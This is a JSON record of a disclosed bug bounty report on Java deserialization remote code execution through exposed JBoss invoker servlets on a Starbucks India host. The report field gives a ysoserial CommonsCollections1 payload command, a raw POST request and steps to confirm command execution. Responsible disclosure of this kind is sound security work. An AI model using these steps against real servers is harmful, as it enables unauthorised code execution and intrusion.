{
  "id": 153026,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTMwMjY=",
  "url": "https://hackerone.com/reports/153026",
  "title": "Java Deserialization RCE via JBoss JMXInvokerServlet/EJBInvokerServlet on card.starbucks.in",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-07-21T23:04:33.767Z",
  "submitted_at": "2016-07-21T23:04:33.767Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "meals",
    "url": "/meals",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/411/6d37adb1666131d39f36c8e0d715709b7381b052_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1989,
    "url": "https://hackerone.com/starbucks",
    "handle": "starbucks",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Starbucks",
      "twitter_handle": "Starbucks",
      "website": "http://www.starbucks.com",
      "about": "OUR MISSION WITH EVERY CUP, WITH EVERY CONVERSATION, WITH EVERY COMMUNITYâ€“ WE NURTURE THE LIMITLESS POSSIBILITIES OF HUMAN CONNECTION"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-02-03T22:47:45.617Z",
  "bug_reporter_agreed_on_going_public_at": "2017-01-13T02:45:31.331Z",
  "team_member_agreed_on_going_public_at": "2017-02-03T22:47:45.584Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I found an open JMXInvokerServlet/EJBInvokerServlet and normally I should be able to get a shell just by doing that. However I think due to some egress filtering on the box I've been having issues getting a shell to run.\n\nInvokers: https://card.starbucks.in/invoker/EJBInvokerServlet and https://card.starbucks.in/invoker/JMXInvokerServlet\n\nCommand to output serialized data to a file:\n$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' > serialdata\n{F106535}\n\nThis puts the serialized data for executing cmd.exe into a file that I can then paste into burp.\n\nCreate a new burp repeater tab and paste in the following (running on https):\n\nPOST /invoker/EJBInvokerServlet HTTP/1.1\nHost: card.starbucks.in\nAccept: */*\nAccept-Language: en\nContentType: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Length: 0\n\nThen right click an select \"Paste from file\"\n{F106537} \n\nHit Go and our burp repeater tab should look like the following:\n{F106538} \n\nYou will notice I am searching for the string \"cannot find\" in the response tab. If a file is not found on the windows host it will return saying \"The system cannot find the file specified\" as well as another variation of that.  Since the first request is for cmd.exe which IS found on the system this error is not present. This can also be verified by running telnet, ftp, calc.exe.\n\nThe following will produce a \"The system cannot find the file specified\" error:\n$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'fakefile.exe' > serialdata\n\nBurp Output:\n{F106541} \n\n\nThis is proving that files are being run on the system.",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-02-12T02:45:31.363Z",
  "allow_singular_disclosure_after": -220959217.42978743,
  "singular_disclosure_allowed": true,
  "vote_count": 41,
  "voters": [
    "derision",
    "sp1d3rs",
    "thaivu",
    "mashoud1122",
    "bogdantcaciuc",
    "tk0",
    "b6117130df17feef13481e3",
    "bl4de",
    "psaux",
    "meals",
    "and 31 more..."
  ],
  "structured_scope": {
    "databaseId": 12995,
    "asset_type": "OTHER",
    "asset_identifier": "Other assets",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
